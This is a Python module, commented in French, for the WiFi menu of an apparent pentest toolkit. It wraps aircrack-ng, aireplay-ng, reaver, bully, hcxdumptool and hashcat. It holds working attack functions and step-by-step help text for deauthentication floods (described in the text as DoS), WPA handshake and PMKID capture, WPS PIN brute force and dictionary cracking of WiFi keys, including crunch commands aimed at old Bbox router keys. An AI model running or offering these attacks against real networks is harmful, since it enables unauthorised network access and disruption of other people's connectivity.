"""WiFi — 12 actions. Statuts honnêtes face aux box récentes (PMF, WPA3)."""

import os
import subprocess
from core import ui, runner


def _list_ifaces():
    try:
        out = subprocess.check_output(["iw", "dev"], text=True)
        return [line.split()[1] for line in out.splitlines() if "Interface" in line]
    except Exception:
        return []


def _pick_iface():
    ifaces = _list_ifaces()
    if not ifaces:
        ui.err("aucune interface WiFi détectée (iw dev)"); return None
    ui.info("interfaces : " + ", ".join(ifaces))
    return ui.ask("interface", default=ifaces[0])


def monitor_start():
    ui.header("Activer mode monitor")
    if not runner.check_tools(["airmon-ng"]): ui.pause(); return
    iface = _pick_iface()
    if not iface: ui.pause(); return
    runner.run(["airmon-ng", "check", "kill"], tag="airmon-kill", root=True)
    runner.run(["airmon-ng", "start", iface], tag="airmon-start", root=True)
    ui.ok("vérifie l'interface (généralement wlan0mon)"); ui.pause()


def monitor_stop():
    ui.header("Désactiver mode monitor")
    iface = _pick_iface()
    if not iface: ui.pause(); return
    runner.run(["airmon-ng", "stop", iface], tag="airmon-stop", root=True)
    runner.run(["systemctl", "restart", "NetworkManager"], tag="nm-restart", root=True)
    ui.pause()


def scan_networks():
    ui.header("Scan WiFi (airodump-ng) — Ctrl-C pour stop")
    iface = _pick_iface()
    if not iface: ui.pause(); return
    runner.run(["airodump-ng", iface], tag="airodump-scan", root=True)
    ui.pause()


def scan_targeted():
    ui.header("Scan ciblé (BSSID + channel) — capture vers fichier")
    iface = _pick_iface()
    bssid = ui.ask("BSSID cible (AA:BB:..)")
    chan  = ui.ask("channel")
    out   = ui.ask("préfixe fichier", default="capture")
    if not (iface and bssid and chan): ui.pause(); return
    runner.run(["airodump-ng", "-c", chan, "--bssid", bssid, "-w", out, iface],
               tag="airodump-target", root=True)
    ui.pause()


def capture_handshake():
    ui.header("Capture handshake WPA")
    iface = _pick_iface()
    bssid = ui.ask("BSSID"); chan = ui.ask("channel")
    out   = ui.ask("préfixe fichier", default="hs")
    if not (iface and bssid and chan): ui.pause(); return
    ui.warn("Dans un AUTRE terminal lance le deauth :")
    ui.info(f"  sudo aireplay-ng -0 5 -a {bssid} {iface}\n")
    runner.run(["airodump-ng", "-c", chan, "--bssid", bssid, "-w", out, iface],
               tag="airodump-hs", root=True)
    ui.pause()


def deauth_client():
    ui.header("Deauth — un client précis")
    iface = _pick_iface()
    bssid = ui.ask("BSSID AP"); client = ui.ask("MAC client")
    count = ui.ask("nb paquets (0=infini)", default="10")
    if not (iface and bssid and client): ui.pause(); return
    runner.run(["aireplay-ng", "-0", count, "-a", bssid, "-c", client, iface],
               tag="deauth-one", root=True)
    ui.pause()


def deauth_all():
    ui.header("Deauth broadcast — tous clients de l'AP")
    iface = _pick_iface()
    bssid = ui.ask("BSSID AP"); count = ui.ask("nb paquets", default="20")
    if not (iface and bssid): ui.pause(); return
    if not ui.confirm(f"Confirmer deauth broadcast sur {bssid} ?"): return
    runner.run(["aireplay-ng", "-0", count, "-a", bssid, iface], tag="deauth-all", root=True)
    ui.pause()


def wps_pixie():
    ui.header("WPS pixie dust (reaver)")
    if not runner.check_tools(["reaver"]): ui.pause(); return
    iface = _pick_iface(); bssid = ui.ask("BSSID"); chan = ui.ask("channel")
    if not (iface and bssid and chan): ui.pause(); return
    runner.run(["reaver", "-i", iface, "-b", bssid, "-c", chan, "-K", "1", "-vv"],
               tag="wps-pixie", root=True)
    ui.pause()


def wps_bully():
    ui.header("WPS bruteforce (bully)")
    if not runner.check_tools(["bully"]): ui.pause(); return
    iface = _pick_iface(); bssid = ui.ask("BSSID"); chan = ui.ask("channel")
    if not (iface and bssid and chan): ui.pause(); return
    runner.run(["bully", "-b", bssid, "-c", chan, iface], tag="wps-bully", root=True)
    ui.pause()


def pmkid_capture():
    ui.header("PMKID capture (hcxdumptool)")
    if not runner.check_tools(["hcxdumptool"]): ui.pause(); return
    iface = _pick_iface(); out = ui.ask("fichier de sortie", default="pmkid.pcapng")
    if not iface: ui.pause(); return
    runner.run(["hcxdumptool", "-i", iface, "-w", out, "--enable_status=1"],
               tag="hcxdump", root=True)
    ui.ok(f"convertir : hcxpcapngtool -o pmkid.hc22000 {out}")
    ui.ok("crack    : hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt")
    ui.pause()


def crack_handshake():
    ui.header("Crack handshake (aircrack-ng + dictionnaire)")
    if not runner.check_tools(["aircrack-ng"]): ui.pause(); return
    cap = ui.ask(".cap/.pcap")
    wl  = ui.ask("wordlist", default="/usr/share/wordlists/rockyou.txt")
    if not cap: ui.pause(); return
    if not os.path.exists(wl):
        ui.warn(f"wordlist absente — gunzip {wl}.gz"); ui.pause(); return
    runner.run(["aircrack-ng", "-w", wl, cap], tag="aircrack")
    ui.pause()


def crack_pmkid():
    ui.header("Crack PMKID (hashcat mode 22000)")
    if not runner.check_tools(["hashcat"]): ui.pause(); return
    hf = ui.ask("fichier .hc22000")
    wl = ui.ask("wordlist", default="/usr/share/wordlists/rockyou.txt")
    if not hf: ui.pause(); return
    runner.run(["hashcat", "-m", "22000", hf, wl], tag="hashcat-pmkid")
    ui.pause()


ITEMS = [
    {
        "label": "Activer mode monitor", "fn": monitor_start, "status": "tool",
        "info": """Met la carte WiFi en mode monitor (= 'écoute' tout le trafic radio).

QUAND       : avant TOUTE attaque WiFi
PRÉREQUIS   : carte qui supporte le monitor (Alfa AWUS, Panda, chipsets Atheros/Realtek)
              + sudo + airmon-ng
SORTIE      : nouvelle interface 'wlan0mon' (ou 'wlanXmon')
TIPS        : 'check kill' tue NetworkManager qui interfère
              Vérifier le support : 'iw list | grep -A8 modes' → chercher 'monitor'
LIMITES     : carte intégrée laptop souvent NE supporte PAS le monitor
              5 GHz DFS channels (52-144) souvent inaccessibles"""
    },
    {
        "label": "Désactiver mode monitor", "fn": monitor_stop, "status": "tool",
        "info": """Sort du mode monitor + redémarre NetworkManager pour récupérer le WiFi normal.

QUAND       : à la fin de la session de test
TIPS        : si le WiFi ne revient pas → redémarrer la machine"""
    },
    {
        "label": "Scan réseaux WiFi", "fn": scan_networks, "status": "ok",
        "info": """Liste tous les APs visibles + clients connectés. Ctrl-C pour arrêter.

QUAND       : repérage de cibles
SORTIE      : BSSID | PWR | CH | ENC | CIPHER | AUTH | ESSID | + section 'STATION' (clients)
LECTURE     :
  - PWR     : signal (plus négatif = plus loin, -50 fort, -80 faible)
  - ENC     : WPA2 / WPA3 / OPN / WEP
  - CIPHER  : CCMP (WPA2 std), GCMP (WPA3)
  - AUTH    : PSK = mdp partagé / SAE = WPA3 / MGT = enterprise
TIPS        : channel-hop par défaut → certains paquets manqués
              Pour focus : 'airodump-ng --channel 6 wlan0mon'"""
    },
    {
        "label": "Scan ciblé + capture", "fn": scan_targeted, "status": "ok",
        "info": """Lock sur un BSSID + channel + sauve les paquets vers fichier.

QUAND       : préparation à la capture de handshake / PMKID
SORTIE      : fichiers capture-01.cap, .csv, .kismet.csv
TIPS        : si client connecté → handshake apparaît dès qu'il se reconnecte
              Le voyant 'WPA handshake: XX:XX:..' en haut à droite = capturé"""
    },
    {
        "label": "Capturer handshake WPA", "fn": capture_handshake, "status": "cfg",
        "info": """Capture le 4-way handshake WPA2 quand un client se (re)connecte.

WORKFLOW    : 1. Lancer ce scan ciblé (ce menu)
              2. Dans autre terminal : aireplay-ng -0 5 -a <BSSID> wlan0mon
              3. Attendre qu'un client se reconnecte
              4. 'WPA handshake' s'affiche en haut → fichier prêt pour crack
PRÉREQUIS   : au moins UN client connecté à l'AP
LIMITES (BOX MODERNES) :
  - PMF activé (WPA3 ou WPA2+PMF) → deauth ignoré par les clients récents
  - Solution alternative : PMKID (ne nécessite ni client ni deauth)
  - Sur Bbox Next Gen testée avec firmware 2024+ : PMF actif par défaut"""
    },
    {
        "label": "Deauth — un client", "fn": deauth_client, "status": "cfg",
        "info": """Envoie des trames de deauthentication pour kicker un client précis de l'AP.

QUAND       : forcer reconnexion → capture handshake / DoS ciblé
PRÉREQUIS   : connaître MAC client (visible dans 'STATION' de airodump)
LIMITES     :
  - PMF/802.11w activé → trame ignorée, le client reste connecté
  - Tous les WPA3 ont PMF obligatoire
  - WPA2 récent peut l'avoir activé (vérifier 'cipher AUTH' = MGT ou présence MFP)
TEST RAPIDE : -0 1 sur ton propre tel → s'il déco, PMF off, l'attaque marche"""
    },
    {
        "label": "Deauth — broadcast (tous)", "fn": deauth_all, "status": "cfg",
        "info": """Deauth envoyé en broadcast → tous les clients de l'AP.

QUAND       : DoS du réseau WiFi entier / capture multi-clients
ÉTHIQUE     : très destructif → demander confirmation. Ne JAMAIS sur réseaux tiers.
LIMITES     : idem deauth client — PMF bloque tout
              Beaucoup de box loggent le burst et alertent l'admin"""
    },
    {
        "label": "WPS pixie dust (reaver)", "fn": wps_pixie, "status": "old",
        "info": """Casse le PIN WPS en exploitant une faille de génération (E-S1/E-S2).

QUAND       : AP avec WPS activé + chipset vulnérable (Broadcom/Ralink anciens)
DURÉE       : 1-30 secondes si vulnérable, immédiatement échec sinon
SORTIE      : 'WPS PIN: XXXXXXXX' + 'WPA PSK: <mot de passe>'
LIMITES (RAISON DU STATUT 'VIEUX') :
  - WPS désactivé par défaut sur la majorité des firmwares depuis 2017
  - Bbox Next Gen, Freebox récente, SFR Box 8 : WPS off
  - Si WPS activé manuellement → encore possible
PRÉVÉRIF    : 'wash -i wlan0mon' → liste APs avec WPS ON
              Colonne 'Lck' = Yes → tentative locked-out, attendre"""
    },
    {
        "label": "WPS bruteforce (bully)", "fn": wps_bully, "status": "old",
        "info": """Bruteforce le PIN WPS 8 chiffres (max ~11000 essais grâce au split).

QUAND       : WPS activé mais pas vulnérable au pixie dust
DURÉE       : 4-10h sans lockout
LIMITES     :
  - Lockout après N essais (la box bloque WPS X minutes)
  - WPS désactivé sur la plupart des box récentes (cf wps-pixie)
  - PMF n'affecte PAS WPS (couche différente)"""
    },
    {
        "label": "PMKID capture (hcxdumptool)", "fn": pmkid_capture, "status": "cfg",
        "info": """Capture le PMKID dans le 1er paquet d'association (sans deauth, sans client !).

QUAND       : meilleure alternative au handshake si PMF activé
              ou si aucun client n'est connecté
COMMENT     : hcxdumptool écoute et attend qu'un client tente une assoc
              → AP renvoie PMKID dans le 1er paquet (RSN IE)
              → on l'attrape sans avoir à kicker personne
DURÉE       : 30s à 5 min en moyenne
SUITE       : hcxpcapngtool -o hash.hc22000 capture.pcapng
              hashcat -m 22000 hash.hc22000 wordlist.txt
LIMITES     :
  - Certains AP modernes randomisent ou n'envoient pas le PMKID
  - WPA3 SAE n'utilise PAS de PMKID (immunisé)
  - WPA2 reste vulnérable même avec PMF (PMKID = phase 1, avant PMF)"""
    },
    {
        "label": "Crack handshake (aircrack)", "fn": crack_handshake, "status": "cfg",
        "info": """Bruteforce le PSK depuis le .cap contenant le handshake, avec une wordlist.

PERFS       : aircrack-ng = CPU only (lent). Pour GPU → hashcat mode 22000.
TIPS        :
  - rockyou.txt = 14M passwords, ~20 min CPU pour test complet
  - Pour mdp ciblé (8 hex MAJ pour vieilles Bbox) :
    crunch 8 8 0123456789ABCDEF | aircrack-ng -w - capture.cap
LIMITES (FORCE DU MDP) :
  - Mdp 'fort' (10+ caractères random) = uncrackable avec ressources réalistes
  - Bbox récente : 10 caractères alphanum mixte = 62^10 = 8.4*10^17
    → impossible en bruteforce pur
  - Stratégie : wordlists thématiques (prénoms, années, mdp leaked)"""
    },
    {
        "label": "Crack PMKID (hashcat 22000)", "fn": crack_pmkid, "status": "cfg",
        "info": """Crack le PMKID/PSK avec hashcat en mode 22000 (GPU = 100-1000× plus rapide).

PERFS       : RTX 3060 ≈ 500 kH/s sur WPA2 → rockyou en 30s
              RTX 4090 ≈ 2.5 MH/s → 10s
RÈGLES UTIL.:
  - hashcat -m 22000 hash wl.txt -r /usr/share/hashcat/rules/best64.rule
  - Ajoute mutations (P@ssword2024, etc.)
LIMITES     : même limite que crack handshake → la force du mdp domine
              Pas de GPU dédié = CPU only = très lent"""
    },
]


def menu():
    while True:
        idx = ui.menu("WIFI", ITEMS)
        if idx is None: return
        ITEMS[idx]["fn"]()
